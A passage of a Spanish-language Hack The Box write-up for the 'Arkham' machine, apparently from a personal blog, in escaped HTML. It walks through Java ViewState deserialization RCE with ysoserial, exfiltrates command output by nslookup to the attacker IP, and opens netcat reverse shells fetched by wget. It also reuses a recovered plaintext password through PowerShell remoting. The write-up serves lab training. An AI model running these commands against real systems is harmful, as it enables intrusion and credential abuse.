&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;n&#34;&gt;sendPayload&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;viewstatePayload&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Para la ejecucion de comandos utilizamos ysoserial-modified.jar para generar un payload:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;CommonsCollections1, CommonsCollections2, CommonsCollections3, CommonsCollections4, CommonsCollections5, CommonsCollections6
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;em&gt;Funciona tambien con la version ysoserial.jar, pero se tienen comandos &amp;lsquo;limitados&amp;rsquo;, la version modificada es una mejor version que nos permite ejecutar comandos cmd/powershell/sh.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Ya que desconocemos del payload que funciona, utilizamos los descritos anteriormente, vamos a hacer un request DNS a nuestra maquina con cada payload (ej: &lt;code&gt;nslookup CommonsCollections1 10.10.1X.1X&lt;/code&gt;) y el payload que funcione nos aparecer√° en nuestra terminal (Utilizamos &lt;a href=&#34;https://github.com/SpiderLabs/Responder&#34;&gt;&lt;strong&gt;responder&lt;/strong&gt;&lt;/a&gt;).&lt;/p&gt;
&lt;p&gt;Aqui se encuentra el codigo:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/sckull/ctf-stuff/tree/master/arkham&#34;&gt;&lt;strong&gt;Codigo Java - GitHub&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;De igual forma realice un script en python para el mismo fin, utilizando la libreria pydes.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/sckull/ctf-stuff/blob/master/arkham/deserialization-java.py&#34;&gt;&lt;strong&gt;Codigo Python - GitHub&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;rce---request-dns-&#34;&gt;RCE - Request DNS&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Peek%202019-04-17%2017-49.gif&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Obtenemos un request DNS y vemos que los payloads que funcionan en arkham son &lt;code&gt;CommonsCollections5, CommonsCollections6&lt;/code&gt;, por lo que podemos utilizar cualquiera de ellos para ejecutar comandos en la maquina.&lt;/p&gt;
&lt;p&gt;De igual forma utilizando nslookup podemos saber que usuario somos y que usuarios existen en la maquina, utilizando los siguientes comandos.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;whoami&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;//10.10.13.129 &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; /f %i in &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;whoami&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;do&lt;/span&gt; nslookup %i 10.10.13.129
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;dir C:\Users&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;//10.10.13.129 &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; /f &lt;span class=&#34;s2&#34;&gt;&amp;#34;tokens=1,2,3&amp;#34;&lt;/span&gt; %a in &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;dir /B &amp;#34;C:\Users&amp;#34;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;do&lt;/span&gt; nslookup %a.%b.%c 10.10.13.129
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Screenshot%20from%202019-04-17%2018.15.01.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;shell---alfred-&#34;&gt;Shell - Alfred&lt;/h1&gt;
&lt;p&gt;Para obtener una shell inversa vamos a utilizar powershell para descargar netcat (&lt;code&gt;nc.exe&lt;/code&gt;) y ejecutar una shell inversa.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Comando&lt;/strong&gt;: Cambiamos el primer parametro de cmand a &amp;ldquo;powershell&amp;rdquo;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;nb&#34;&gt;wget &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;13&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;129&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;nc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-o&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Public&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;nc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exe&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Public&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;nc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-e&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Windows&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;System32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WindowsPowerShell&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;powershell&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;13&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;129&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;443&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Obtenemos una shell inversa como Alfred y nuestra bandera &lt;code&gt;User.txt&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Peek%202019-04-17%2018-33.gif&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Screenshot%20from%202019-04-17%2018.35.33.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;usuarios---arkham&#34;&gt;Usuarios - Arkham&lt;/h2&gt;
&lt;p&gt;Podemos ver que existen otros dos usuarios Batman y Administrator.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Screenshot%20from%202019-04-17%2018.57.42.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Vemos que Batman pertenece al grupo de Administrators.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Screenshot%20from%202019-04-17%2019.01.12.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;user---batman-&#34;&gt;User - Batman&lt;/h1&gt;
&lt;p&gt;En el directorio &lt;code&gt;C:\Users\alfred\Downloads\backups&lt;/code&gt; encontramos un archivo &lt;code&gt;backup.zip&lt;/code&gt;, lo trasladamos a nuestra maquina con &lt;a href=&#34;https://nakkaya.com/2009/04/15/using-netcat-for-file-transfers/&#34;&gt;&lt;strong&gt;netcat&lt;/strong&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Screenshot%20from%202019-04-17%2018.37.16.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al descomprimirlo nos muestra un archivo &lt;code&gt;.ost&lt;/code&gt; de Microsoft Outlook, utilizamos readpst para leer el archivo de correos el cual nos extrajo los borradores (&lt;code&gt;Drafts.mbox&lt;/code&gt;).&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Screenshot%20from%202019-04-17%2018.40.52.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Para lectura de &lt;code&gt;Drafts.mbox&lt;/code&gt; utilizamos &lt;code&gt;mutt&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;mutt -Rf Drafts.mbox
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Peek%202019-04-17%2018-51.gif&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Encontramos una imagen de cmd con un comando que contiene un usuario y contrase√±a:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;net use G: &lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;10.10.10.10&lt;span class=&#34;se&#34;&gt;\g&lt;/span&gt;otham /user:batman Zx^#QZX+T!123
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Screenshot%20from%202019-04-17%2018.55.13.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos powershell para cambiar al usuario(sesion) Batman con el siguiente comando:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$username&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;ARKHAM\batman&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$password&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;convertto-securestring&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-AsPlainText&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Force&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-String&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Zx^#QZX+T!123&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; 
&lt;span class=&#34;nv&#34;&gt;$cred&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;New-Object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Management&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Automation&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;PSCredential&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-ArgumentList&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$username&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$password&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; 
&lt;span class=&#34;nb&#34;&gt;New-PSSession&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Credential&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$cred&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Enter-PSSession&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Peek%202019-04-17%2019-03.gif&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Exitosamente pudimos cambiar al usuario Batman pero no podemos listar los directorios y archivos.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Screenshot%20from%202019-04-17%2019.05.15.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;shell---batman-&#34;&gt;Shell - Batman&lt;/h2&gt;
&lt;p&gt;Para obtener una shell inversa con el usuario Batman vamos a utilizar &lt;code&gt;Invoke-Command&lt;/code&gt; para descargar netcat (&lt;code&gt;nc.exe&lt;/code&gt;) en el directorio de Batman y ejecutar una shell inversa, el siguiente comando se ejecuta con el usuario alfred.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$username&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;ARKHAM\batman&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$password&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Zx^#QZX+T!123&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$securePassword&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;ConvertTo-SecureString&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$password&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-AsPlainText&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Force&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$credential&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;New-Object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Management&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Automation&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;PSCredential&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$username&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$securePassword&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;nb&#34;&gt;Invoke-Command&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Credential&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$credential&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-ComputerName&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ARKHAM&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Command&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;powershell&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;wget &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;15&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;8081&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;nc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-o&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Batman&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Documents&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;nc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exe&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;powershell&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Batman&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Documents&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;nc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-e&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Windows&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;System32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WindowsPowerShell&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;powershell&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;15&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;445&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Peek%202019-04-18%2015-37.gif&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Obtenemos una shell y podemos ejecutar comandos, pero no podemos acceder a la carpeta de Administrator.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Screenshot%20from%202019-04-18%2015.39.02.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;root&#34;&gt;Root&lt;/h1&gt;
&lt;p&gt;Por alguna razon el siguiente comando funciona para acceder a la carpeta de Administrator, y obtenemos nuestra bandera &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
